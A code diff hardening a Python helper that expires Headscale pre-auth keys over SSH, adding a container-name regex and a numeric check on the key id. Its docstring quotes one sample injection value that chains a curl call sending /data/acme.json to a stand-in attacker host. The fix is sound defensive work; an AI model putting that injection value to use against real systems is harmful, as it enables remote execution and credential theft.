@@ -74,6 +74,10 @@ _ROW = re.compile(
 )
 
 
+# Docker container names: what the daemon itself accepts, no wider.
+_SAFE_CONTAINER = re.compile(r"[A-Za-z0-9][A-Za-z0-9_.-]*")
+
+
 def _strip_ansi(text: str) -> str:
     return re.sub(r"\x1b\[[0-9;]*m", "", text)
 
@@ -234,7 +238,25 @@ def expire_headscale_preauthkey(ssh_target: str, key_id: str, container: str = "
     command would hang or abort depending on the ssh buffer -- a failure that
     looks like a network problem and is not. Flags verified against the running
     v0.28 binary rather than assumed: it is `--id`, not `--identifier`.
+
+    Both arguments are validated at this boundary rather than at the caller.
+    Raised in review of #1353: the CLI path is safe because it matches `key_id`
+    against ids it parsed from headscale's own output, but this function is
+    importable and the argument is interpolated into a string that a remote shell
+    executes. A caller passing `"20; curl attacker/?k=$(cat /data/acme.json)"`
+    would get arbitrary execution on the VPS. `headscale_apikeys` shares the
+    pattern, but this one MUTATES, so the blast radius is larger and the guard
+    belongs where the string is built, not where today's only caller happens to
+    be careful.
+
+    A `raise`, not an `assert`: assertions vanish under `python -O`, and a guard
+    that an interpreter flag can switch off is not a guard.
     """
+    if not key_id.isdigit():
+        raise ValueError(f"pre-auth key id must be numeric, got {key_id!r}")
+    if not _SAFE_CONTAINER.fullmatch(container):
+        raise ValueError(f"unsafe container name {container!r}")
+
     result = subprocess.run(
         [
             "ssh",
